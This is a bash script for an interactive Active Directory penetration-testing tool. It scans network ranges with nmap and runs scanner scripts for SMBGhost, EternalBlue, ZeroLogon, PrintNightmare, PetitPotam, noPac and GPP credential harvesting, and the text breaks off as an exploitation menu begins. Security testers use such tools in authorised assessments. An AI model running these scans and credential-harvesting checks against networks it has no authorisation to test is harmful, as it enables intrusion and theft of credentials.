#!/bin/bash
#######################################################
# => SECTION UTILITIES INSTALLATION
#######################################################
if ! command -v "nmap" > /dev/null; then sudo apt install nmap; fi
if ! command -v "crackmapexec" > /dev/null; then sudo snap install crackmapexec; fi

#######################################################
# => SECTION DEFINITION (VARIABLES, FUNCTIONS, ETC.)
#######################################################
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'
UNDERLINE='\33[4m'
BOLD='\33[1m'

get_interface(){
    select interface in $(ls "/sys/class/net/"); do 
        # echo "$interface" selected
        echo "$interface"
        break
    done
}

get_ip_listening(){
    interface=$1
    ip_listening="$(/sbin/ifconfig $interface | grep 'inet ' | cut -d ' ' -f10)"
    echo "$ip_listening"
}

get_value_int(){
    sub_value=$1
    sup_value=$2
    while true; do
        printf "\nEnter a value between %s and %s: " "$sub_value" "$sup_value"
        read -r val 
        if (("$val" >= "$sub_value" && "$val" <= "$sup_value")); then
            return "$val"
        else
            printf "%b\nThe value is not an integer between %s and %s%b" "${RED}" "$sub_value" "$sup_value" "${NC}"
        fi
    done
    
}


#######################################################
# => SECTION SCANNING NETWORK
#######################################################
scanning_network(){
    printf "%b\nEntering into [SCANNING NETWORK] menu...%b" "${YELLOW}" "${NC}"
    printf "\nThe network will be scanned to get IP with the following opened ports: \n \
        - RPC ports: 135, 593 \n \
        - SMB ports: 139, 445 \n \
        - RDG ports: 3391 \n \
        - Domain name \n \
        - Domain controllers (IP and hostname)"
    network_ip="";subnet=""
	cd "$PATH_TO_WORKSPACE" || exit
	if [[ -n $(find "known-data/network/" -name 'open-*-ip_*') ]]; then
        printf "\nChoose among the following ranges or select 'Quit' to scan another range:\n"
		readarray -t ranges_scanned < <(find "known-data/network/" -name 'open-*-ip_*' | cut -d '_' -f2 | sort -u)
		select range in "${ranges_scanned[@]}" Quit
		do
			printf "\nSelected item #%s. We will use the chosen range : %s\n" "$REPLY" "$range";
			if [[ "$range" == "Quit" ]]; then
				break
			fi
			network_ip="$(echo "$range" | cut -d '-' -f1)" && subnet="$(echo "$range" | cut -d '-' -f2)";break;
		done
    fi

	if [ -z "$network_ip" ]; then
        printf "%b\nWhat is the network range (IP-subnet) to scan?%b" "${BLUE}" "${NC}"
        printf "\nEnter the IP: "
        read -r network_ip
        printf "\nWhat is its subnet?"
        printf "\nEnter the subnet: "
        read -r subnet
    fi

    printf "%b\nChecking opened ports for SMB on $network_ip/$subnet...%b" "${YELLOW}" "${NC}"
	if [ ! -e "$PATH_TO_WORKSPACE/known-data/network/open-microsoftDS-ip_$network_ip-$subnet" ]; then
		nmap "$network_ip"/"$subnet" -p139,445 -n -Pn --open -oG - | awk '/^Host/ && /Ports/ { for (i=1;i<=NF;i++) {if (match($i,/open/)) {split($i, map, "/"); printf "%s %s %s\n",$2, map[1],map[5]}}}' | sort -u > "$PATH_TO_WORKSPACE/known-data/network/open-microsoftDS-ip_$network_ip-$subnet" &
		wait
	else
		printf "\n%bThe range %s/%s on SMB ports has already been scanned... \n%bDo you really want to re-analyze it?" "${RED}" "$network_ip" "$subnet" "${NC}"
		printf "%b\nEnter your answer (YES or NO): " "${NC}"
		read -r answer
		if [ "$answer" == 'YES' ]; then
    		nmap "$network_ip"/"$subnet" -p139,445 -n -Pn --open -oG - | awk '/^Host/ && /Ports/ { for (i=1;i<=NF;i++) {if (match($i,/open/)) {split($i, map, "/"); printf "%s %s %s\n",$2, map[1],map[5]}}}' | sort -u > "$PATH_TO_WORKSPACE/known-data/network/open-microsoftDS-ip_$network_ip-$subnet" &
			wait
		fi
	fi

    printf "%b\nChecking opened ports for RPC on $network_ip/$subnet...%b" "${YELLOW}" "${NC}"
	# if [ ! -e "$PATH_TO_WORKSPACE/known-data/network/open-RPC-ip_$network_ip-$subnet" ]; then
	if [ ! -e "$PATH_TO_WORKSPACE/known-data/network/open-RPC-ip_$network_ip-$subnet" ]; then
	    nmap "$network_ip"/"$subnet" -p135,593 -n -Pn --open -oG - | awk '/^Host/ && /Ports/ { for (i=1;i<=NF;i++) {if (match($i,/open/)) {split($i, map, "/"); printf "%s %s %s\n",$2, map[1],map[5]}}}' | sort -u > "$PATH_TO_WORKSPACE/known-data/network/open-RPC-ip_$network_ip-$subnet" &
		wait
	else
		printf "\n%bThe range %s/%s on RPC ports has already been scanned... \n%bDo you really want to re-analyze it?" "${RED}" "$network_ip" "$subnet" "${NC}"
		printf "%b\nEnter your answer (YES or NO): " "${NC}"
		read -r answer
		if [ "$answer" == 'YES' ]; then
		    nmap "$network_ip"/"$subnet" -p135,593 -n -Pn --open -oG - | awk '/^Host/ && /Ports/ { for (i=1;i<=NF;i++) {if (match($i,/open/)) {split($i, map, "/"); printf "%s %s %s\n",$2, map[1],map[5]}}}' | sort -u > "$PATH_TO_WORKSPACE/known-data/network/open-RPC-ip_$network_ip-$subnet" &
			wait
		fi
	fi

    printf "%b\nChecking opened ports for RDG on $network_ip/$subnet...%b" "${YELLOW}" "${NC}"
	# if [ ! -e "$PATH_TO_WORKSPACE/known-data/network/open-RDG-ip_$network_ip-$subnet" ]; then
	if [ ! -e "$PATH_TO_WORKSPACE/known-data/network/open-RDG-ip_$network_ip-$subnet" ]; then
		nmap "$network_ip"/"$subnet" -p3391 -n -Pn --open -oG - | awk '/^Host/ && /Ports/ { for (i=1;i<=NF;i++) {if (match($i,/open/)) {split($i, map, "/"); printf "%s %s %s\n",$2, map[1],map[5]}}}' | sort -u > "$PATH_TO_WORKSPACE/known-data/network/open-RDG-ip_$network_ip-$subnet" &
		wait
	else
		printf "\n%bThe range %s/%s on RDG ports has already been scanned... \n%bDo you really want to re-analyze it?" "${RED}" "$network_ip" "$subnet" "${NC}"
		printf "%b\nEnter your answer (YES or NO): " "${NC}"
		read -r answer
		if [ "$answer" == 'YES' ]; then
		    nmap "$network_ip"/"$subnet" -p3391 -n -Pn --open -oG - | awk '/^Host/ && /Ports/ { for (i=1;i<=NF;i++) {if (match($i,/open/)) {split($i, map, "/"); printf "%s %s %s\n",$2, map[1],map[5]}}}' | sort -u > "$PATH_TO_WORKSPACE/known-data/network/open-RDG-ip_$network_ip-$subnet" &
			wait
		fi
	fi

    # Getting domain name & domain controllers
    printf "%b\nChecking domain name & domain controllers (IP, hostname) on $network_ip/$subnet...%b" "${YELLOW}" "${NC}"
    python3 "$PATH_TO_WORKSPACE/SCANNER_AD/get_domain-infos.py" "$network_ip" "$subnet"

    printf "%b\n\n=> The files are saved into known-data/network\n%b" "${BLUE}" "${NC}"
    printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"

}


#######################################################
# => SECTION SCANNING/EXPLOITING VULNS
#######################################################
scanning_vulns_without-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [SEARCHING VULNERABILITIES WITHOUT ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nThe known attacks are:%b" "${BOLD}" "${NC}"
    printf "%b\n=> ZeroLogon, SMBGhost, SMBleed, BlueGate, MS14-068, MS08-67, SMB Signing%b\n" "${BLUE}" "${NC}"
    ad_user_name="";ad_user_pwd="";ad_user_hash="";domain_name="";fqdn="";tld=""
    printf "\n%bChoose among the following domains:%b\n" "${BOLD}" "${NC}"
    readarray -t list_domains < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt")
    select domain in "${list_domains[@]}" Quit
    do
        printf "$domain" "$REPLY"
        if [[ "$domain" == "Quit" ]]; then return; fi
        domain_name=$(echo "$domain" | cut -d "," -f2 )
        fqdn=$(echo "$domain" | cut -d "," -f1)
        tld=$(echo "$domain" | cut -d "," -f3);
        printf "\n%bThe chosen domain : $domain_name (fqdn: $fqdn, tld: $tld).%b\n" "${BLUE}" "${NC}"
        break
    done
    if [ -z "$domain_name" ]; then
        printf "You should have specified the domain name into the file: domain-infos_list.txt"
        return
    fi
    while true; do
        PS3="Select actions to carry out: "
        choices_action=(
            "Option 01: Searching for IP vulnerable to SMBGhost attack"
            "Option 02: Searching for IP vulnerable to SMBleed attack"
            "Option 03: Searching for IP vulnerable to MS17-010 attack"
            "Option 04: Searching for IP vulnerable to MS08-067 [!! THIS OPTION IS SHOWN BUT WILL NOT BE EXECUTED EXCEPT IF YOU UNCOMMENT THE PART BC THIS ATTACK CAN BE HURTFUL]"
            "Option 05: Searching for IP vulnerable to PetitPotam with null session attack"
            "Option 06: Searching for IP vulnerable to SMB Signing attack"
            "Option 07: Searching for IP vulnerable to PrinterBug (or SpoolSample) attack"
            "Option 08: Searching for IP vulnerable to MS14-068 (Kerberos Checksum attack) attack"
            "Option 09: Searching for IP vulnerable to ZeroLogon attack"
            "Option 10: Searching for IP vulnerable to GPP abuse attack"
            "Option 11: Searching for IP vulnerable to BlueGate attack"
        )
        printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
        select action in "${choices_action[@]}" Quit
        do
            printf "\nSelected action #%s. We will %s\n\n" "$REPLY" "$choice_action";break;
        done
        if [[ "$action" == "Quit" ]]; then
            return
        fi
        # ATTACKING SMB PORTS : 445 
        while read -r ip port service; do
            # Attack: SMBGhost (or CVE-2020-0796)
            if [[ "$REPLY" == "1" ]]; then
                if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip"; then
                    printf "\n${RED}Trying SMBGhost against %s:%s (service: %s)...\n${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/smbghost_cve20200796_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbghost_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi

            # Attack: SMBleed (or CVE-2020-1206)
            elif [[ "$REPLY" == "2" ]]; then
                if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip"; then
                    printf "\n${RED}Trying SMBleed against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/smbleed_cve20201206_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-smbleed_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi

            # Attack: Eternal Blue (or MS17-010)
            elif [[ "$REPLY" == "3" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip" ; then
                    printf "\n${RED}Trying EternalBlue against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/eternalblue_ms17010_scanner.py" -p "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue-wa_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi

            # Attack: Netapi (or MS08-067)
            elif [[ "$REPLY" == "4" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip" ; then
                    printf "\n${RED}Trying MS08-067 against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/netapi_cve20084250_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms08-67_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi

            # Attack: NTLM Relayx
            elif [[ "$REPLY" == "6" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled"; then
                    printf "\n${RED}Checking SMB Signing status against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/smbsigning_scanner.py" "$ip" "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/smb_signing_disabled"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
        done < <(cat "$PATH_TO_WORKSPACE"/known-data/network/open-microsoftDS-ip_*)

        # ATTACKING RPC PORTS : 135, 593 
        while read -r ip port service; do
            # Attack: PetitPotam with nullsession
            if [[ "$REPLY" == "5" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"; then
                    printf "\n${RED}Trying PetitPotam against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "guest" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "" "" "" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam-nullsession_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
            # Attack: PrinterBug (or SpoolSample)
            if [[ "$REPLY" == "7" ]]; then
                if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip"; then
                    printf "\n${RED}Checking Spooler service against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/rpcdump_scanner.py" "$ip" -port "$port" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/printerbug_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
        done < <(cat "$PATH_TO_WORKSPACE"/known-data/network/open-RPC-ip_*)


        # ATTACKING DOMAIN CONTROLLERS
        while read -r dc_name dc_ip; do
            # Attack: ZeroLogon (or CVE-2020-1472) : TO DO
            if [[ "$REPLY" == "9" ]]; then
                if ! grep -q "$dc_ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip"; then
                    printf "\n${RED}Trying ZeroLogon against the DC : %s (%s)...${NC}" "$dc_ip" "$dc_name"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/zerologon_cve20201472_scanner.py" "$dc_name" "$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-zerologon_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi

            # Attack: GPP abuse without account
            if [[ "$REPLY" == "10" ]]; then
                if ! grep -q "$dc_ip" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"; then
                    printf "\n${RED}Searching credentials into the SYSVOL of the DC : %s (%s)...${NC}" "$dc_ip" "$dc_name"
                    # with guest
                    python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "guest"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
                    # with anonymous
                    python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py"  "":""@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
        done < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-controllers_list.txt" | tr ',' ' ')


        # ATTACKING RDG PORTS : 3391 
        while read -r ip port service; do
            # Attack: BlueGate (or CVE-2020-0610)
            if [[ "$REPLY" == "11" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip"; then
                    printf "\n${RED}Trying BlueGate attack against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/bluegate_cve20200610_scanner.py" -M check -P "$port" "$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-bluegate_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
        done < <(cat "$PATH_TO_WORKSPACE"/known-data/network/open-RPC-ip_*)
        printf "%b\n\n=> The files are saved into known-data/vulns\n%b" "${BLUE}" "${NC}"
    done
}

scanning_vulns_with-domain-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [SEARCHING VULNERABILITIES WITH DOMAIN ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nThe known attacks are:%b" "${BOLD}" "${NC}"
    printf "%b\n=> EternalBlue, PrintNightmare, MIC Remove attack, PetitPotam, sAMAccountName spoofing, Coerce (PrinterBug, DFSCoerce, etc.)%b\n" "${BLUE}" "${NC}"
    ad_user_name="";ad_user_pwd="";ad_user_hash="";domain_name="";fqdn="";tld=""
    printf "\nChoose among the following domains:\n"
    readarray -t list_domains < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt")
    select domain in "${list_domains[@]}" Quit
    do
        if [[ "$domain" == "Quit" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        elif printf '%s\0' "${list_domains[@]}" | grep -Fxqz -- "$domain"; then
            domain_name=$(echo "$domain" | cut -d "," -f2 ) && fqdn=$(echo "$domain" | cut -d "," -f1), tld=$(echo "$domain" | cut -d "," -f3);
            printf "\n%bThe chosen domain : $domain_name (fqdn: $fqdn, tld: $tld).%b\n" "${BLUE}" "${NC}"
            break
        else
            printf "%b\nThe selected option doesn't exist.%b" "${RED}" "${NC}" 
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done

    printf "\nChoose among the following users:\n"
    readarray -t list_users < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/dom-users_list.txt")
    select user in "${list_users[@]}" Quit
    do
        if [[ "$user" == "Quit" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        elif printf '%s\0' "${list_users[@]}" | grep -Fxqz -- "$user"; then
            ad_user_name=$(echo "$user" | cut -d "," -f1) && ad_user_pwd=$(echo "$user" | cut -d "," -f2) && ad_user_hash=$(echo "$user" | cut -d "," -f3)
            printf "\n%bThe chosen user : $ad_user_name (password: $ad_user_pwd, hash: $ad_user_hash).%b\n" "${BLUE}" "${NC}"
            break
        else
            printf "%b\nThe selected option doesn't exist.%b" "${RED}" "${NC}" 
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done

    PS3="Select actions to carry out: "
    choices_action=(
        "Option 01: Searching for IP vulnerable to MS17-010 attack"
        "Option 02: Searching for IP vulnerable to PrintNightmare attack"
        "Option 03: Searching for IP vulnerable to MIC Remove attack"
        "Option 04: Searching for IP vulnerable to PetitPotam attack"
        "Option 05: Searching for IP vulnerable to sAMAccountName spoofing attack"
        "Option 06: Searching for IP vulnerable to GPP Abuse with account attack"
        "Option 07: Searching for IP vulnerable to SMB Pipes attacks"
    )
    while true; do
        printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
        select action in "${choices_action[@]}" Quit
        do
            printf "\nSelected action #%s. We will %s\n\n" "$REPLY" "$choice_action";break;
        done
        if [[ "$action" == "Quit" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi

        while read -r ip port service; do
            # Attack: Eternal Blue (or MS17-010)
            if [[ "$REPLY" == "1" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip" ; then
                    printf "\n${RED}Trying EternalBlue against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/eternalblue_ms17010_scanner.py" -p "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/ms17-010-eternalblue_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi

            # Attack: PrintNightmare (or CVE-2021-1675 / CVE-34527)
            elif [[ "$REPLY" == "2" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"; then
                    printf "\n${RED}Trying PrintNightmare attack against %s:%s (service: %s) with user: %s:%s...${NC}" "$ip" "$port" "$service" "$ad_user_name" "$ad_user_pwd"
                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/printnightmare_cve20211675_scanner.py" -check "$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
                    else python3 "$PATH_TO_WORKSPACE/SCANNER/printnightmare_cve20211675_scanner.py" -check "$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-printnightmare_vulns-ip"
                    fi 
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi

            # Attack: MIC Remove attack (or CVE-2019-1040)
            elif [[ "$REPLY" == "3" ]]; then
                if ! grep -q "$ip"  "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"; then
                    printf "\n${RED}Trying MIC Remove attack against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/micRA_cve20191040_scanner.py" -port "$port" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
                    else  python3 "$PATH_TO_WORKSPACE/SCANNER/micRA_cve-2019-1040_scanner.py" -port "$port" "$domain_name"/"$ad_user_name"@"$ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/micRA_vulns-ip"
                    fi
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
        done < <(cat "$PATH_TO_WORKSPACE"/known-data/network/open-microsoftDS-ip_*)

        # ATTACKING RPC PORTS : 135, 593 
        while read -r ip port service; do
            # Attack: PetitPotam with session      
            if [[ "$REPLY" == "4" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip"; then
                    printf "\n${RED}Trying PetitPotam against %s:%s (service: %s)...${NC}" "$ip" "$port" "$service"
                    python3 "$PATH_TO_WORKSPACE/SCANNER/petitpotam_scanner.py" "$ip" "$port" "$domain_name" "$ad_user_name" "$ad_user_pwd" "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/petitpotam_vulns-ip"
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
        done < <(cat "$PATH_TO_WORKSPACE"/known-data/network/open-RPC-ip_*)

        # ATTACKING DOMAIN CONTROLLERS
        while read -r dc_name dc_ip; do
            # Attack: sAMAccountName spoofing/noPac (or CVE-2021-42278)
            if [[ "$REPLY" == "5" ]]; then
                if ! grep -q "$dc_ip" "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"; then
                    printf "\n${RED}Trying sAMAccountName Spoofing attack against the DC : %s (%s) with : %s:%s...${NC}" "$dc_ip" "$dc_name" "$ad_user_name" "$ad_user_pwd"
                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/sAMAccountName_cve202142278_scanner.py" -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name":"$ad_user_pwd" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
                    else python3 "$PATH_TO_WORKSPACE/SCANNER/sAMAccountName_cve-2021-42278_scanner.py" -dc-host "$dc_name" -scan "$domain_name"/"$ad_user_name" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/cve-sAMAccountNameSpoofing_vulns-ip"
                    fi
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi

            # Attack: GPP abuse with an account
            elif [[ "$REPLY" == "6" ]]; then
                if ! grep -q "$ip" "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse_vulns-ip"; then
                    printf "\n${RED}Searching credentials into the SYSVOL of the DC : %s (%s)...${NC}" "$dc_ip" "$dc_name"
                    if [ -n "$ad_user_pwd" ]; then python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name":"$ad_user_pwd"@"$dc_ip" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
                    else python3 "$PATH_TO_WORKSPACE/SCANNER/getgppcreds_scanner.py" "$domain_name"/"$ad_user_name"@"$dc_ip" -hashes "$ad_user_hash" | grep "Results = " | cut -d "=" -f2 | sed 's/ //g' >> "$PATH_TO_WORKSPACE/known-data/vulns/gppabuse-wa_vulns-ip"
                    fi
                else
                    printf "%b\nThe ip : %s has already been scanned and added to the file.%b\n" "${RED}" "$ip" "${NC}"
                fi
            fi
        done < <(tail -n +2 "$PATH_TO_WORKSPACE/known-data/accounts/domain-controllers_list.txt" | tr ',' ' ')
        printf "%b\n\n=> The files are saved into known-data/vulns\n%b" "${BLUE}" "${NC}"
    done
}


exploiting_vulns_without-account(){
	cd "$PATH_TO_WORKSPACE/known-data" || exit
    printf "%b\nEntering into [EXPLOITING VULNERABILITIES WITHOUT ACCOUNT] menu...%b" "${YELLOW}" "${NC}"
    printf "%b\nThe known attacks are:%b" "${BOLD}" "${NC}"
    printf "%b\n=> ZeroLogon, SMBGhost, SMBleed, BlueGate, MS14-068, MS08-67, SMB Signing%b\n" "${BLUE}" "${NC}"
    ad_user_name="";ad_user_pwd="";ad_user_hash="";domain_name="";fqdn="";tld=""
    printf "\n%bChoose among the following domains:%b\n" "${BOLD}" "${NC}"
    readarray -t list_domains < <(tail -n +2 $PATH_TO_WORKSPACE/known-data/accounts/domain-infos_list.txt)
    select domain in "${list_domains[@]}" Quit
    do
        if [[ "$domain" == "Quit" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        elif printf '%s\0' "${list_domains[@]}" | grep -Fxqz -- "$domain"; then
            domain_name=$(echo "$domain" | cut -d "," -f2)
            fqdn=$(echo "$domain" | cut -d "," -f1)
            tld=$(echo "$domain" | cut -d "," -f3);
            printf "\n%bThe chosen domain : $domain_name (fqdn: $fqdn, tld: $tld).%b\n" "${BLUE}" "${NC}"
            break
        else
            printf "%b\nThe selected option doesn't exist.%b" "${RED}" "${NC}" 
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
    done

    while true; do
        PS3="Select actions to carry out: "
        choices_action=(
            "Option 01: Exploiting IP vulnerable to SMBGhost attack"
            "Option 02: Exploiting IP vulnerable to SMBleed attack"
            "Option 03: Exploiting IP vulnerable to MS17-010 attack"
            "Option 04: Exploiting IP vulnerable to MS08-067 [!! THIS OPTION IS SHOWN BUT WILL NOT BE EXECUTED EXCEPT IF YOU UNCOMMENT THE PART BC THIS ATTACK CAN BE HURTFUL]"
            "Option 05: Exploiting IP vulnerable to PetitPotam with null session attack"
            "Option 06: Exploiting IP vulnerable to SMB Signing attack"
            "Option 07: Exploiting IP vulnerable to PrinterBug (or SpoolSample) attack"
            "Option 08: Exploiting IP vulnerable to MS14-068 (Kerberos Checksum attack) attack"
            "Option 09: Exploiting IP vulnerable to ZeroLogon attack"
            "Option 10: Exploiting IP vulnerable to GPP abuse attack"
            "Option 11: Exploiting IP vulnerable to BlueGate attack"
        )
        printf "%b\n=> Menu%b\n" "${UNDERLINE}" "${NC}"
        select action in "${choices_action[@]}" Quit
        do
            printf "\nSelected action #%s. We will %s\n\n" "$REPLY" "$choice_action";break;
        done
        if [[ "$action" == "Quit" ]]; then
            printf "%b\nReturning to the menu...\n%b" "${YELLOW}" "${NC}"
            return
        fi
        # ATTACKING SMB PORTS : 445 
        # Attack: SMBGhost (or CVE-2020-0796)
        if [[ "$REPLY" == "1" ]]; then
